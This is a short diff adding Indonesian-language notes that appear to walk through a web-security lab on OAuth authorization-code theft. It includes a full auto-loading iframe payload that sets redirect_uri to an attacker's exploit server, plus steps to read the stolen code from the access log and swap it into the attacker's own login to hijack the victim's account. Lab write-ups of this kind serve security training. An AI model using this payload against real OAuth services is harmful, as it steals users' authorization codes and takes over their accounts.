@@ -1,0 +1,5 @@
+-Buat request untuk mendapatkan info url GET yang mengarah ke endpoint, contoh /auth?client_id... lalu copy url nya
+-Masuk ke exploit server di lab kemudian tambahkan auto exec syntax di baggian body html seperti <iframe> lebih lengkapnya
+  <iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+  setelah disesuaikan kirim ke victim lalu pantau di log acces maka kita akan mendapatkan kode authorization code yang berguna untuk proses mendapatkan acces_token
+-buat skenario login dengan medsos sendiri yang benar lalu cari bagian request yang membutuhkan authorization kode kemuudian ganti dengan kode yang baru kita dapatkan dan selesai
